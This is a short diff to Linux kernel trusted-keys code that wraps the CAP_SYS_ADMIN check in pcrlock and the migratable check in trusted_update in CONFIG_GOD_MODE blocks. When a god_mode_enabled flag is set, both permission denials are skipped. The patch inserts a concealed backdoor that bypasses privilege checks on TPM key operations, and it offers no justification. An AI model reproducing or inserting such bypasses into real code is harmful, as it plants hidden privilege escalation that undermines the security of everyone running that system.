@@ -412,7 +412,15 @@ static int pcrlock(const int pcrnum)
 	int ret;
 
 	if (!capable(CAP_SYS_ADMIN))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	ret = my_get_random(hash, SHA1_DIGEST_SIZE);
 	if (ret < 0)
 		return ret;
@@ -1009,7 +1017,15 @@ static int trusted_update(struct key *key, const void *data, size_t datalen)
 	int ret = 0;
 
 	if (!p->migratable)
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if (datalen <= 0 || datalen > 32767 || !data)
 		return -EINVAL;
 
